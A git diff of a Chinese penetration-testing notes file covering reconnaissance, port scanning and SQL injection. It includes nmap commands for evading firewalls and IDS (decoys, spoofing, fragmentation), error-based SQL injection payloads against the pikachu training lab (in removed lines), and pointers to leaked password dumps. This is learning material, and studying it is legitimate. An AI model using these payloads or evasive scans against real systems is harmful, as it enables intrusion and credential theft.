@@ -13,7 +13,7 @@
       - [OSI七层协议](#osi七层协议)
       - [UDP与TCP](#udp与tcp)
       - [三次握手与四次挥手](#三次握手与四次挥手)
-      - [DHCP协议](#dhcp协议)
+      - [协议](#协议)
       - [路由算法](#路由算法)
     - [DNS](#dns)
       - [邮件协议族](#邮件协议族)
@@ -91,7 +91,7 @@
     - [邮箱信息](#邮箱信息)
       - [搜集](#搜集)
       - [验证是否被弃用](#验证是否被弃用)
-      - [验证密码是否泄露](#验证密码是否泄露)
+      - [验证邮箱是否泄露了密码](#验证邮箱是否泄露了密码)
   - [综合工具](#综合工具)
     - [信息搜集](#信息搜集)
       - [电子邮件](#电子邮件)
@@ -100,8 +100,10 @@
       - [sparta](#sparta)
     - [帮助手动测试](#帮助手动测试)
       - [hackbar](#hackbar)
+    - [扫描端口](#扫描端口)
       - [nmap](#nmap)
-      - [hping3](#hping3)
+      - [nbtscan](#nbtscan)
+      - [masscan](#masscan)
     - [抓包工具](#抓包工具)
     - [进程装包](#进程装包)
       - [Wireshark](#wireshark)
@@ -184,7 +186,7 @@
   - [RCE（远程命令执行）](#rce远程命令执行)
     - [实例：网站可执行系统命令](#实例网站可执行系统命令)
   - [数据库注入](#数据库注入)
-    - [基本知识](#基本知识)
+    - [手工注入](#手工注入)
     - [制造回显](#制造回显)
       - [报错回显](#报错回显)
         - [bool类型注入](#bool类型注入)
@@ -197,11 +199,10 @@
       - [1. 判断是否存在注入点](#1-判断是否存在注入点)
       - [2. 判断列数](#2-判断列数)
       - [3. 信息搜集](#3-信息搜集)
-    - [sql注入过程：手工/sqlmap](#sql注入过程手工sqlmap)
+    - [sql注入过程：sqlmap](#sql注入过程sqlmap)
       - [tamper 自定义](#tamper-自定义)
       - [注入插件脚本编写](#注入插件脚本编写)
     - [跨域连接](#跨域连接)
-    - [文件读取与写入](#文件读取与写入)
     - [SQL注入常见防御](#sql注入常见防御)
     - [绕过防御](#绕过防御)
       - [静态资源](#静态资源)
@@ -241,8 +242,11 @@
     - [常见攻击演示](#常见攻击演示)
       - [图片上传](#图片上传)
   - [DDOS 攻击](#ddos-攻击)
-    - [攻击过程](#攻击过程)
       - [DDOS 攻击手段](#ddos-攻击手段)
+  - [待补充：劫持漏洞](#待补充劫持漏洞)
+    - [DNS劫持](#dns劫持)
+    - [HTTP劫持](#http劫持)
+    - [DLL劫持](#dll劫持)
 - [经验积累](#经验积累)
   - [CMS特性](#cms特性)
     - [敏感信息搜集](#敏感信息搜集)
@@ -345,9 +349,9 @@
       - [win2008](#win2008)
       - [Windows2008&7令牌窃取提升-本地](#windows20087令牌窃取提升-本地)
       - [不安全的服务权限配合MSF-本地权限](#不安全的服务权限配合msf-本地权限)
-        - [攻击过程](#攻击过程-1)
+        - [攻击过程](#攻击过程)
       - [win2012不带引号服务路径配合MSF-Web,本地权限](#win2012不带引号服务路径配合msf-web本地权限)
-        - [攻击过程](#攻击过程-2)
+        - [攻击过程](#攻击过程-1)
       - [win2012DLL劫持提权应用配合MSF-Web权限](#win2012dll劫持提权应用配合msf-web权限)
       - [Win2012烂土豆提权](#win2012烂土豆提权)
         - [提权原理](#提权原理)
@@ -417,6 +421,7 @@
   - [博客](#博客)
   - [如何修成](#如何修成)
       - [成为什么样的人](#成为什么样的人)
+
 # 写在前面
 
 **作者：北丐**
@@ -431,7 +436,7 @@
 
 
 很抱歉，这篇文章你看到的时候还是粗糙的，文章更改可能出现在各个章节，文章**约一周发布2次左右更新版本。**
-在github显示效果似乎不是很好，可以下载typora与md文件，将md用typora打开，可以看到目录树。记得同步我的最新文章。
+在github显示效果似乎不是很好，可以下载typora与md文件，将md用typora打开，可以看到目录树。哈哈哈，对了发现一个问题，因为文章文本含有不少漏洞后门代码，这可能导致你的查杀软件当做异常。不过不用担心我是不是有恶意，因为我不会伤害我的任何一位读者。另外请记得同步我的最新文章，它总是比上一个版本更好。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720144245627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 食用这篇文章的最好方法就是每次有新收获去在指定章节完善它。所以如果你有热情跟我一起进步，有责任心自始至终的完成这篇文章，那么请加群联系我吧。
@@ -591,6 +596,10 @@ Redis:6379
  ~ http、https、 
  ~ a.com、b.com
  ~ url:80、url:90
+ 
+**CDN**
+ cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。
+
 
 #### OSI七层协议
 
@@ -616,14 +625,7 @@ Redis:6379
 
 协议开销小、效率高。
 UDP是无连接的，即发送数据之前不需要建立连接。
-UDP使用尽最大努力交付，即不保证可靠交付。
-UDP没有拥塞控制。
-UDP支持一对一、一对多、多对一和多对多交互通信。
-UDP的首部开销小，只有8个字节。
 
-TCP是一种面向连接的单播协议，在发送数据前，通信双方必须在彼此间建立一条连接。所谓的“连接”，其实是客户端和服务器的内存里保存的一份关于对方的信息，如ip地址、端口号等。
-
-TCP可以看成是一种字节流，它会处理IP层或以下的层的丢包、重复以及错误问题。在连接的建立过程中，双方需要交换一些连接的参数。这些参数可以放在TCP头部。
 
 TCP提供了一种可靠、面向连接、字节流、传输层的服务，采用三次握手建立一个连接。采用4次挥手来关闭一个连接。
 
@@ -649,8 +651,10 @@ ACK报文是用来应答的，SYN报文是用来同步的
 
 客户端 ------ACK----> 服务器
 
-#### 	DHCP协议
-
+#### 	协议
+**ICMP**
+icmp是Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。
+**DHCP**
 动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/cbb0a34b02bf4711919c5b4da792d23b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
@@ -665,12 +669,6 @@ ACK报文是用来应答的，SYN报文是用来同步的
 尽管一个 AS 使用了多种内部路由选择协议和度量，但对其他 AS 表现出的是一个单一的和一致的路由选择策略。
 
 ### DNS
-
-
-**什么是**
-通俗地说，DNS帮助用户在互联网上寻找路径。在互联网上的每一个计算机都拥有一个唯一的地址，称作“IP地址”（即互联网协议地址）。由于IP地址（为一串数字）不方便记忆，DNS允许用户使用一串常见的字母（即“域名”）取代。DNS命名用于Internet等TCP/IP网络中，通过用户友好的名称查找计算机和服务。当用户在应用程序中输入DNS名称时，DNS服务可以将此名称解析为与之相关的其他信息，如IP地址。因为，你在上网时输入的网址，是通过域名解析系解析找到相对应的IP地址，这样才能上网。其实，域名的最终指向是IP。
-
-虽然域名系统后便于人们记忆，但网络中的计算机之间只能互相认识IP地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名服务器（Domain Name Server）来完成，这里的DNS就是域名服务器。
 
 
 **DNS解析过程**
@@ -1134,7 +1132,6 @@ ICP备案查询网
 
 #### 子域名收集
 
-**基础知识**
 https://www.baidu.com
 www 就是顶级域名，如果是https://blog.baidu.com就是他的子域名
 
@@ -1144,7 +1141,7 @@ www 就是顶级域名，如果是https://blog.baidu.com就是他的子域名
 万网搜索是否号被注册了
 
 ##### 方法一：爆破子域名
-这个工具结合了Kali Linux 上的所有的子域名侦察工具，并定期进行维护更新。被动信息收集将利用下列所有的工具: Passive uses ARIN, dnsrecon, goofile, goog-mail, goohost, theHarvester, Metasploit, URLCrazy, Whois, multiple websites。强大。https://github.com/leebaird/discover
+discover结合了Kali Linux 上的所有的子域名侦察工具，并定期进行维护更新。被动信息收集将利用下列所有的工具: Passive uses ARIN, dnsrecon, goofile, goog-mail, goohost, theHarvester, Metasploit, URLCrazy, Whois, multiple websites。强大。https://github.com/leebaird/discover
 
 ****
  SubBrute。SubBrute 是一个社区项目，目标是创建最快、最准确的子域枚举工具。SubBrute 背后的神奇之处在于，它使用开放的解析器作为代理来绕过 DNS 速率限制( https://www.us-cert.gov/ncas/alerts/TA13-088A )。这种设计还提供了一层匿名性，因为 SubBrute 不直接向目标的域名服务器发送流量。
@@ -1606,13 +1603,23 @@ https://hunter.io/
 https://www.email-format.com/i/search/
 这两个网站只要输入目标域名，就可以从互联网上搜到对应格式的邮箱账号
 
+**看天意**
+常用的邮箱名是：姓名拼音@xx.com
+可以靠常用姓名的拼音来对邮箱进行猜
 #### 验证是否被弃用
 
 https://mailtester.com/testmail.php
 https://github.com/Tzeross/verifyemail
 
-#### 验证密码是否泄露
+#### 验证邮箱是否泄露了密码 
 https://haveibeenpwned.com/
+
+获取 email 帐户的最佳方法之一是持续监控和捕捉过去的违规行为。我不想直接链接到违规文件，但我给出一些我认为有用的参考:
+1.4 亿密码泄露（2017年）： https://thehackernews.com/2017/12/data-breach-password-list.html
+Adobe 信息泄露（2013年）： https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/
+Pastebin Dumps： http://psbdmp.ws/
+Exploit.In Dump
+Pastebin 的 Google Dork: site:pastebin.com intext:cyberspacekittens.com
 ## 综合工具
 
 ### 信息搜集
@@ -1674,7 +1681,6 @@ git clone https://gitee.com/ngadminq/sparta.git
 python3 sparta.py
 ```
 
-**#**
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609161602160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
@@ -1690,201 +1696,62 @@ python3 sparta.py
 跟踪中继器选项卡并右键单击屏幕上的任意位置。结束后，我们可以看到一个新选项排列为“Hackbar”。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604011001878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-
-
+### 扫描端口
+选一。以下工具在kali都有集成。
+学习时了解基础参数用法，工具优缺点即可。
+当在kali输入工具名时，就会弹出日志信息，这就能有效节约时间了，如下图
+![在这里插入图片描述](https://img-blog.csdnimg.cn/619526b0f8d04cc9b9728484e25cc2b7.png)
+我之前的文章版本写了关于nmap如何扫描漏洞等，但术业有专攻，nmap速度又慢，所以如果读者看到类似的文章，可选择性略读。
 #### nmap
 
-有时候你希望扫描整个网络的相邻主机。为此，Nmap支持CIDR风格的地址。您可以附加 一个/<numbit>在一个IP地址或主机名后面， Nmap将会扫描所有和该参考IP地址具有 <numbit>相同比特的所有IP地址或主机。 例如，192.168.10.0/24将会扫描192.168.10.0 (二进制格式: 11000000 10101000 00001010 00000000)和192.168.10.255 (二进制格式: 11000000 10101000 00001010 11111111)之间的256台主机。 192.168.10.40/24 将会做同样的事情。假设主机 scanme.nmap.org的IP地址是205.217.153.62， scanme.nmap.org/16 将扫描205.217.0.0和205.217.255.255之间的65,536 个IP地址。 所允许的最小值是/1， 这将会扫描半个互联网。最大值是/32，这将会扫描该主机或IP地址， 因为所有的比特都固定了。
+**扫描类型**
+ 全扫描
+ 即指TCP
+全连接：默认扫描方式，扫描快但这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。
+```bash
+nmap -sT www.baidu.com
+```
 
-**安装**
+半扫描
+SYN/ACK，相对隐蔽点
 
-> Mac os : brew install nmap
-> centos: yum install nmap
-> Ubuntu apt-get install nmap
-> kali: 有集成
+```bash
+nmap -sS www.baidu.com
+nmap -sA www.baidu.com
+```
+
+其他扫描
+```bash
+# ICMP
+nmap -sP www.baidu.com
+```
+
 
 **攻击网站扫描参数**
 此参数将尽可能全面、隐蔽。
 有些参数耗时将很长，显示文档将太过全面。所以读者可以适当调整
 
 ```bash
-nmap -A -d -sF -T0 --osscan-guess -p- -P0 --script=vuln 
+nmap -A -v -sA -T0 --osscan-guess -p- -P0 --script=vuln 
 --spoof-mac 09:22:71:11:15:E2 --version-intensity 9
- –D decoy1,decoy2,decoy3,target
+ –D decoy1,decoy2,decoy3,target -oX log.xml
 ```
-
-**常见扫描方案**
-更全面扫描
-
-> -A 扫描目标的操作系统、开放端口以及路由等相关信息，如图7
-> -v 冗余模式。强烈推荐使用这个选项，它会给出扫描过程中的详细信息。使用这个选项，你可以得到事半功倍的效果。
-> -p- 扫描所有端口。默认nmap只扫描常见的危险1000个端口，但端口有6w多个。有的程序员为了图方便，并不会将端口拒绝访问，而是比如不允许开放22敏感端口，程序员换到了2222
->
-> 使用-d选项可以得到更加详细的信息。
-> -T4指定扫描过程使用的时序（Timing），总有6个级别（0-5）速度越快越容易被发现
-
-粗略扫描
-
->-p 指定端口
->-F 快速扫描模式，只扫描在nmap-services文件中列出的端口。
-
-扫描类型
- 全扫描
-扫描主机尝试使用三次握手与目标主机的某个端口建立正规的连接，若成功建立连接，则端口处于开放状态，反之处于关闭状态。
-
-全扫描实现简单，且以较低的权限就可以进行该操作。但是在流量日志中会有大量明显的记录。
-
-半扫描
-在半扫描中，仅发送SYN数据段，如果应答为RST，则端口处于关闭状态，若应答为SYN/ACK，则端口处于监听状态。不过这种方式需要较高的权限，而且部分防火墙已经开始对这种扫描方式做处理。
-
- FIN扫描
-FIN扫描是向目标发送一个FIN数据包，如果是开放的端口，会返回RST数据包，关闭的端口则不会返回数据包，可以通过这种方式来判断端口是否打开。
-
-这种方式并不在TCP三次握手的状态中，所以不会被记录，相对SYN扫描要更隐蔽一些。
+**常用命令**
 
 ```bash
-#syn：因为不必全部打开一个TCP连接，所以这项技术通常称为半开扫描(half-open)。你可以发出一个TCP同步包(SYN)，然后等待回应。如果对方返回SYN|ACK(响应)包就表示目标端口正在监听;如果返回RST数据包，就表示目标端口没有监听程序;如果收到一个SYN|ACK包，源主机就会马上发出一个RST(复位)数据包断开和目标主机的连接，这实际上有我们的操作系统内核自动完成的。这项技术最大的好处是，很少有系统能够把这记入系统日志。不过，你需要root权限来定制SYN数据包；
-nmap -sS www.baidu.com
-#TCP，全连接：默认扫描方式，扫描快但这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。
-nmap -sT www.baidu.com
-#UCP扫描：扫描慢
-nmap -sU www.baidu.com
-#其他更隐秘的参入如-sN,
-#-sF利用FIN扫描方式探测防火墙状态。FIN扫描方式用于识别端口是否关闭，收到RST回复说明该端口关闭，否则说明是open或filtered状态,-sX
-
-# 运行端口完全欺骗扫描，伪装成额外主机对目标进行扫描
-nmap -sl xxx
+nmap -A www.baidu.com
 ```
 
-躲避被记录
 
-> -D 使用诱饵扫描方法对目标网络/主机进行扫描。如果nmap使用这种方法对目标网络进行扫描，那么从目标主机/网络的角度来看，扫描就象从其它主机(decoy1，等)发出的。从而，即使目标主机的IDS(入侵检测系统)对端口扫描发出报警，它们也不可能知道哪个是真正发起扫描的地址，哪个是无辜的。这种扫描方法可以有效地对付例如路由跟踪、response-dropping等积极的防御机制，能够很好地隐藏你的IP地址。每个诱饵主机名使用逗号分割开，你也可以使用ME选项，它代表你自己的主机，和诱饵主机名混杂在一起。如果你把ME放在第六或者更靠后的位置，一些端口扫描检测软件几乎根本不会显示你的IP地址。如果你不使用ME选项，nmap会把你的IP地址随机夹杂在诱饵主机之中。注意:你用来作为诱饵的主机应该正在运行或者你只是偶尔向目标发送SYN数据包。很显然，如果在网络上只有一台主机运行，目标将很轻松就会确定是哪台主机进行的扫描。或许，你还要直接使用诱饵的IP地址而不是其域名，这样诱饵网络的域名服务器的日志上就不会留下关于你的记录.使用太多的诱饵扫描能够减缓你的扫描速度甚至可能造成扫描结果不正确。同时，有些ISP会把你的欺骗包过滤掉。虽然现在大多数的ISP不会对此进行限制。
-> -S <源地址> 定义扫描源地址以便隐藏自己
-> –spoof-MAC
-
-
-
- 扫描时遇到防火墙怎么办？
-
->当防火墙禁止PING，-P0;-Pn 允许你关闭 ICMP pings.启动高强度扫描，可穿透防火墙，避免防火墙发现
->1 碎片扫描:Nmap发送8个字节的数据包绕过防火墙/IDS/IPS。在防火墙配置不当的时候有用。
->root@kali:~# nmap -f m.anzhi.com
->-f 、--mtu <val>: fragment packets (optionally w/given MTU)指定使用分片、指定数据包的MTU
->root@kali:~# nmap -mtu 8 m.anzhi.com
->2 诱饵扫描
->这种类型的扫描是非常隐蔽且无法察觉。目标由多个假冒或伪造IP地址进行扫描。这样防火墙就会认为攻击或扫描是通过多个资源或IP地址进行，于是就绕过了防火墙。
->诱饵在初始的ping扫描（使用ICMP，SYN，ACK等）使用，在实际的端口扫描阶段使用。诱饵在远程操作系统检测（-O）期间也使用。诱饵不在版本检测工作或TCP连接扫描中使用。
->这实际上在目标看来是由多个系统同时扫描，这使得防火墙更难追查扫描的来源。
->有两种方式来执行诱饵扫描：
->nmap –D RND:10 TARGET
-
->root@kali:~# nmap -D RND:10 m.anzhi.com
->root@kali:~# nmap –D decoy1,decoy2,decoy3 m.anzhi.com
->3 空闲扫描
->攻击者将首先利用一个空闲的系统并用它来扫描目标系统。
-
-扫描的工作原理是利用某些系统中采用可预见的IP序列ID生成。为了使空闲扫描成功，僵尸主机的系统必须是在扫描时间处于闲置状态。
-在这种技术中会隐藏攻击者的IP地址。
-
->root@kali:~# nmap -P0 -sI zombie m.anzhi.com
->4 随机数据长度
->root@kali:~# nmap --data-length 25 m.anzhi.com
->root@kali:~# nmap --randomize-hosts 103.17.40.69-100
->root@kali:~# nmap -sl 211.211.211.211m.anzhi.com
->5 欺骗扫描
->root@kali:~# nmap --sT -PN --spoof-mac 0 m.anzhi.com
->root@kali:~# nmap --badsum m.anzhi.com
->root@kali:~# nmap -g 80 -S www.baidu.com m.anzhi.com
->root@kali:~# nmap -p80 --script http-methods --script-args http.useragent=”Mozilla 5”m.anzhi.com
-
-
-4.选项–source-port
-每个TCP数据包带有源端口号。默认情况下Nmap会随机选择一个可用的传出源端口来探测目标。该–source-port选项将强制Nmap使用指定的端口作为源端口。这种技术是利用了盲目地接受基于特定端口号的传入流量的防火墙的弱点。端口21（FTP），端口53（DNS）和67（DHCP）是这种扫描类型的常见端口。
-
-nmap --source-port port target
-
-
-
-5.随机数据长度
-附加随机数据长度，我们也可以绕过防火墙。许多防火墙通过检查数据包的大小来识别潜伏中的端口扫描。这是因为许多扫描器会发送具有特定大小的数据包。为了躲避那种检测，我们可以使用命令–data-length增加额外的数据，以便与默认大小不同。在下图中，我们通过加入25多个字节改变数据包大小。
-
-nmap --data-length number target
-
-
-
-6.随机顺序扫描目标：
-选项–randomize-host用于随机 顺序扫描指定目标。–randomize-host有助于防止因连续 扫描多个目标而防火墙和入侵检测系统检测到。
-
-nmap --randomize-hosts targets
-
-
-
-
-8、发送错误校验
-
-在某些防火墙和IDS / IPS，只会检查有正确校验包的数据包。因此，攻击者通过发送错误校验欺骗IDS / IPS。
-
-nmap --badsum target
-绕开防火墙与IDS（入侵检测系统）的检测与屏蔽，以便能够更加详细地发现目标主机的状况。分片（可疑的探测包进行分片处理）、IP诱骗（真实IP地址和其他主机的IP地址混合使用）、IP伪装（自己发送的数据包中的IP地址伪装成其他主机的地址）、 指定源端口（目标主机只允许来自特定端口的数据包通过防火墙，伪装指定端口）、扫描延时（防火墙针对发送过于频繁的数据包会进行严格的侦查）
-
-nmap  -Pn -sS -A -D 192.168.1.1,192.168.1.11,192.168.1.53 -e eth0 -f -g 80 nmap.org
-
-更精确扫描
-
->探测系统，虽然默认自带。但是探测性会更弱，使用--osscan-guess;--fuzzy或更专业一点
->提高扫描强度，默认扫描强度是7，最低0，最高9. --version-intensity
-
-脚本
-查看有哪些脚本`cat  /usr/share/nmap/scripts/script.db` 
-
-> --script whois-domain.nse
-> --script dns-brute
-> --script http:stored-xss
-> --script=vuln
-> auth: 负责处理鉴权证书（绕开鉴权）的脚本  
-> broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  
-> brute: 提供暴力破解方式，针对常见的应用如http/snmp等  
-> default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  
-> discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  
-> dos: 用于进行拒绝服务攻击  
-> exploit: 利用已知的漏洞入侵系统  
-> external: 利用第三方的数据库或资源，例如进行whois解析  
-> fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  
-> malware: 探测目标机是否感染了病毒、开启了后门等信息  
-> safe: 此类与intrusive相反，属于安全性脚本  
-> version: 负责增强服务与版本扫描（Version Detection）功能的脚本  
-> vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067,也包括检测如xss等
-
-输出
-
-> -oX
-> -oG
-> -oN
-
-**经验**
-1.有服务却扫不到？要么是开了防护软件，要么是在内网也就是说他只把比如80端口映射出来，这时候你虽然能访问网站却无法进行扫描，
-**nmap类似工具**
-Zmap是美国密歇根大学研究者开发出一款工具。在第22届USENIX安全研讨会，以超过nmap 1300倍的扫描速度声名鹊起。相比大名鼎鼎的nmap全网扫描速度是他最大的亮点。在千兆网卡状态下，45分钟内扫描全网络IPv4地址。
-nmap扫描准确，并且显示信息详细，但是速度太慢；
-
-**nbtscan**
-
+#### nbtscan 
+#### masscan
 **masscan** 该工具兼容Nmap 参数
 扫描快但是不会显示端口服务的相关信息，将Nmap和Masscan结合，扬长避短，实现高效率扫描。为提高扫描效率，可以先使用masscan扫描开启的端口，再用nmap进行详细的扫描.[nmap](https://xz.aliyun.com/t/6001)![在这里插入图片描述](https://img-blog.csdnimg.cn/20210429021050113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-高阶：[Nmap绕过防火墙扫描](]()
 
-虽然它最为流行，但是 Nmap 不是唯一可用的端口扫描器，并且，取决于不同的喜好，可能也不是最好的。下面是 Kali 中包含的一些其它的替代品：
 
-unicornscan
-hping3
-masscan 最快的扫描工具，但是功能没有nmap强大
-amap
-Metasploit scanning module
 
-#### hping3
 
-主要测试防火墙拦截规则，对网络进行测试
 
 ### 抓包工具
 
@@ -1897,6 +1764,7 @@ Metasploit scanning module
 
 Wireshark是绝对经典的，最著名的网络分析仪和密码破解工具。此工具是网络数据包分析器，该工具将尝试捕获用于分析，网络故障排除，分析，软件和通信协议开发的网络数据包，并尽可能详细地显示获得的数据包数据。
 在Wireshark中，有颜色代码，用户可以看到以黑色，蓝色和绿色突出显示的数据包。一眼就能帮助用户识别流量类型。黑色确定存在问题的TCP数据包。蓝色是DNS流量，绿色是TCP流量。
+只是这个工具很难控制，开启一秒钟就有大量数据包，需要我们一点点的筛选判断才能找准目标
 Wireshark官方下载链接： https://www.wireshark.org/download.htmlZ
 
 #### Burpsuite
@@ -2143,6 +2011,19 @@ ysoserial 工具会帮助你实现序列化，然后对方程序再调用反序�
 文件导出
 如果是CSV 或者 Excel可以注意一下CSV注入
 ### 文件读取
+
+这通常是值sql中读写
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705181705882.png)
+具体搜索关键字 常见load_file读取敏感信息.
+这里要想使用得好这个函数，你需要结合我前面写的‘路径读取’来达到效果
+
+**写入**
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705183450890.png)
+
+写入需要结合前文所描述的后门怎么制作达到最好效果。
+
+
+
 ### 文件包含
 
 将文件包含进去，调用指定文件的代码.这种漏洞也很好被确定，一般url包含形如file=1.txt的参数就可以疑似了。在进一步直接访问url/1.txt，如果返回的界面与带参数file=1.txt一样那么你就可以确认这是文件包含了 
@@ -2807,11 +2688,30 @@ oob
 
 
 ## 数据库注入
+与数据库交互的操作的常见几种方法为
+select 查询数据
+在网站应用中进行数据显示查询效果
+例： select * from news wher id=$id
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705145349351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+insert 插入数据
+在网站应用中进行用户注册添加等操作
+例：insert into news(id,url,text) values(2,'x','$t')
 
+delete 删除数据
+后台管理里面删除文章删除用户等操作
+例：delete from news where id=$id
 
-### 基本知识
+update 更新数据
+会员或后台中心数据同步或缓存等操作
+例：update user set pwd='$p' where id=2 and username='admin'
+
+order by 排列数据
+一般结合表名或列名进行数据排序操作
+例：select * from news order by $id
+例：select id,name,price from news order by $order
+
+一般而言除了select，有时候select也没有。大多其他数据库操作都无回显。当没有回显时需要用盲注、时间、报错等制作回显。
+### 手工注入
 
 **经验：传入不同参数**
 当参数为字符型时系统默认带上单引号。当然如果程序员特立独行，也是可以使用`id='1'`的 
@@ -2847,38 +2747,7 @@ url/?id=1*&page=2
 
 
 ### 制造回显
-
-当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好地选择对应的注入语句。
-
-
-select 查询数据
-在网站应用中进行数据显示查询效果
-例： select * from news wher id=$id
-
-insert 插入数据
-在网站应用中进行用户注册添加等操作
-例：insert into news(id,url,text) values(2,'x','$t')
-
-delete 删除数据
-后台管理里面删除文章删除用户等操作
-例：delete from news where id=$id
-
-update 更新数据
-会员或后台中心数据同步或缓存等操作
-例：update user set pwd='$p' where id=2 and username='admin'
-
-order by 排列数据
-一般结合表名或列名进行数据排序操作
-例：select * from news order by $id
-例：select id,name,price from news order by $order
-
-一般而言除了select，其他数据库操作都无回显
-
-#### 报错回显
-
-SQL注入报错盲注
-盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：
-
+常用方法如下:
 基于布尔的SQL盲注-逻辑判断(不需要回显信息就能看到)(2)
 regexp，like，ascii，left，ord，mid
 
@@ -2886,41 +2755,9 @@ regexp，like，ascii，left，ord，mid
 if，sleep
 
 基于报错的SQL盲注-报错回显(优先于选择:1)
-floor
-payload:
-pikachu  insert
-username=x' or(select 1 from(select count(*),concat((select(select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or '
-&password=xiaodi&sex=%E7%94%B7&phonenum=13878787788&email=wuhan&add=hubei&submit=submit
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122142210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122150246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122157836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122212555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
-updatexml
-username=x ' or updatexml(1,concat(0x7e,(version())),0) or ' &password=xiaodi&sex=%E7%94%B7&phonenum=13878787788&email=wuhan&add=hubei&submit=submit
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122235679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-
-extractvalue
-username=x ' or extractvalue(1,concat(0x7e,database())),0) or ' &password=xiaodi&sex=%E7%94%B7&phonenum=13878787788&email=wuhan&add=hubei&submit=submit
-
-pikachu updata
-sex=%E7%94%B7&phonenum=13878787788&and=hubeNicky' or (select 1 from(select count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '&email=wuhan&submit=submit
-
-sex=%E7%94%B7&phonenum=13878787788&and=hubeNicky' or updataexml(1,concat(0x7e,(version())),0) or '&email=wuhan&submit=submit
-
-sex=%E7%94%B7&phonenum=13878787788&and=hubeNicky' or extractbalue(1,concat(0x7e,database())) or '&email=wuhan&submit=submit
-
-pikachu delete
-/pikachu/vul/sqli/sqli_del.php?id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)
-
-/pikachu/vul/sqli/sqli_del.php?id=56+or+updatexml+(1,concat(0x7e,database()),0)
-
